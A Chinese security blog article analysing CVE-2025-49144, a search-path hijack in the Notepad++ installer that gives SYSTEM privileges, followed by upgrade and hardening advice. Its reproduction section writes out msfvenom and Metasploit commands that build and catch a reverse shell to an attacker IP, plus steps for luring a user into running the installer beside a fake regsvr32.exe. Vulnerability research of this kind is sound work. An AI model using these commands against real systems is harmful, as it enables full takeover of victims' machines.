---
cve: "CVE-2025-49144"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  Notepad++提权漏洞POC及一键部署环境【CVE-2025-49144】  
原创 赵小龙  红岸基地网络安全   2025-07-05 02:00  
  
# Notepad++ 提权漏洞深度分析  
  
CVE-2025-49144 | 从普通用户到SYSTEM权限  
  
CVSS 8.1 高危漏洞  
  
免责声明  
  
本内容仅限于合法的网络安全学习、研究和教学用途。严禁用于未经授权的渗透测试或攻击行为。使用者需遵守相关法律法规，自行承担因不当使用造成的法律责任。  
  
## 漏洞概述  
  
▍关于Notepad++  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOtjoeLUHkibHFxiczibU2runk1fGZGxVYnu9oNBsLFHQx5akDHE6DVKrAQ/640?wx_fmt=png&from=appmsg "")  
  
  
Notepad++ 是Windows平台广泛使用的开源文本编辑器，支持多种编程语言语法高亮、代码折叠和插件扩展。  
  
▍漏洞核心机制  
  
在Notepad++**8.8.1及之前版本**  
的安装程序中，存在**不安全的可执行文件搜索路径问题**  
。  
  
攻击者可将恶意文件与安装程序置于同一目录（如"下载"文件夹），当用户运行安装程序时，恶意代码将以**SYSTEM权限**  
执行。  
  
攻击路径  
  
1. 诱骗用户下载安装包和恶意文件到同一目录  
  
2. 用户运行Notepad++安装程序  
  
3. 恶意代码以SYSTEM权限执行  
  
## 受影响版本  
  
Notepad++**< 8.8.2**  
  
1  
  
漏洞引入  
  
历史版本均存在  
  
2  
  
漏洞发现  
  
2025年4月  
  
3  
  
修复发布  
  
2025年5月  
  
## 漏洞复现步骤  
  
▍步骤1：生成恶意载荷  
  
msfvenom -p windows/x64/meterpreter/reverse_tcp \  
  
LHOST=攻击者IP LPORT=监听端口 -f c >shellcode.txt  
  
此命令生成C格式的Shellcode，用于后续编译恶意程序。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOld3AbezmErJH4yVrK2l1dbynfWeobxm1kpDyuU64hZ71coia0pDF3SQ/640?wx_fmt=png&from=appmsg "")  
  
  
▍步骤2：编译恶意程序  
  
x86_64-w64-mingw32-gcc regsvr32_loader.c \  
  
-o regsvr32.exe -mwindows  
  
编译生成恶意regsvr32.exe程序，该名称利用了安装程序搜索路径漏洞。  
  
▍步骤3：设置监听  
  
msfconsole  
  
use exploit/multi/handler  
  
set payload windows/x64/meterpreter/reverse_tcp  
  
set LHOST 攻击者IP  
  
set LPORT 监听端口  
  
run  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOm9gZL4mknMB6Iz1PQPB9ibgibZDXtytLia4hurj4dAUrdvVX6ngjic6I6Q/640?wx_fmt=png&from=appmsg "")  
  
  
在攻击机器上设置Metasploit监听，等待受害者连接。  
  
▍步骤4：实施攻击  
  
1. 将  
notepad++_installer.exe  
和  
regsvr32.exe  
放入同一目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOGiauC9VhnSdL0ZO0yHI75Mfx3NF1A7icibkcmjZgiaWz2FLxEx6zj6n74g/640?wx_fmt=png&from=appmsg "")  
  
  
2. 诱骗用户运行安装程序  
  
3. 当安装过程卡住时，攻击已完成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOkATiacsUbH5y1f8w1CgELuUy6BCdznxVeMEUhSRlUiaQInP5d8TdQuoA/640?wx_fmt=png&from=appmsg "")  
  
  
[安装程序卡住时的界面截图位置]  
  
此时已获取SYSTEM权限  
  
## 技术原理分析  
  
▍漏洞根源：DLL搜索顺序劫持  
  
Windows应用程序加载DLL时，默认优先搜索当前目录。Notepad++安装程序在执行过程中会调用系统程序（如regsvr32），但未指定完整路径。  
  
▍攻击链分析  
  
1. 安装程序在当前目录搜索regsvr32.exe  
  
2. 攻击者伪造的恶意regsvr32.exe被优先加载  
  
3. 恶意程序以安装程序的权限（SYSTEM）执行  
  
4. 攻击者获得目标系统的完全控制权  
  
▍实际利用挑战  
  
• 需要用户下载两个文件到同一目录  
  
• 依赖社会工程学技巧诱导用户  
  
• 安装过程中会出现卡顿可能引起怀疑  
  
## 防护与修复方案  
  
▍紧急修复措施  
  
1. 立即升级到  
Notepad++ ≥ 8.8.2  
  
2. 检查已安装版本：帮助 → 关于Notepad++  
  
3. 从官网下载最新安装包：  
https://notepad-plus-plus.org  
  
▍企业防护建议  
  
• 使用软件分发系统统一部署更新  
  
• 限制用户下载目录的执行权限  
  
• 部署端点安全解决方案检测异常行为  
  
• 对用户进行安全意识培训  
  
▍开发者最佳实践  
  
• 始终使用绝对路径调用系统程序  
  
• 实现文件完整性检查机制  
  
• 遵循最小权限原则运行安装程序  
  
下载Notepad++ 8.8.2查看CVE详情  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOpXEyEyIE1YyAU6SHqau4AmZISeuJgcDdiaT585FQdWnicZXhUC6nxsXg/640?wx_fmt=png&from=appmsg "")  
  
  
安全研究仅供参考 | 请遵守网络安全法律法规  
  
© 2025 网络安全实验室 | Notepad++漏洞分析报告  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
